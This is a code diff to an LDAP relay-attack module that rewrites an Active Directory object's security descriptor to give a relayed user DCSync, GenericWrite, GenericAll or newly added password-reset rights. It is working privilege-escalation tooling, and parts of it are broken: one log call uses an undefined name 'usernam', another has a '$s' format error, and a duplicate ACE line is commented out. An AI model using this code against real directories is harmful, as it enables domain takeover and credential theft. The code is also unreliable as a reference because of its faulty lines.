@@ -605,7 +605,7 @@ class LDAPAttack(ProtocolAttack):
             if self.args.rights.lower() in list(rights.keys()):
                 for guid in rights[self.args.rights]:
                     secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid))
-                    secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid))
+                    #secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid))
             else:
                 LOG.error(f'{self.args.rights} right is not valid')
                 return
@@ -615,7 +615,7 @@ class LDAPAttack(ProtocolAttack):
                 if not self.dacl_remove_ace(secDesc, guid, usersid, accesstype):
                     LOG.error(f'ACE not found in {self.args.targetidentity}')
                     return
-        
+
         dn = entry.entry_dn
         data = secDesc.getData()
         self.client.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
@@ -625,15 +625,19 @@ class LDAPAttack(ProtocolAttack):
                     LOG.info('Success! User %s now has Replication-Get-Changes-All privileges on the domain', username)
                 elif self.args.rights == 'writemembers':
                     LOG.info('Success! User %s now has GenericWrite privileges on %s', username, self.args.targetidentity)
+                elif self.args.rights == 'resetpassword':
+                    LOG.info('Success! User %s now has Reset Password privileges on %s', username, self.args.targetidentity)
                 elif self.args.rights == 'all':
                     LOG.info('Success! User %s now has GenericAll privileges on $s', username, self.args.targetidentity)
             else:
                 if self.args.rights == 'dcsync':
                     LOG.info('Success! Replication-Get-Changes-All privileges restored for %s', username)
                 elif self.args.rights == 'writemembers':
-                    LOG.info('Success! GenericWrite privileges restored for %s', username, self.args.targetidentity)
+                    LOG.info('Success! GenericWrite privileges restored for %s', username)
+                elif self.args.rights == 'resetpassword':
+                    LOG.info('Success! Reset Password privileges restored for %s', username)
                 elif self.args.rights == 'all':
-                    LOG.info('Success! GenericAll privileges restored for %s', username, self.args.targetidentity)
+                    LOG.info('Success! GenericAll privileges restored for %s', usernam)
 
 
             # Query the SD again to see what AD made of it
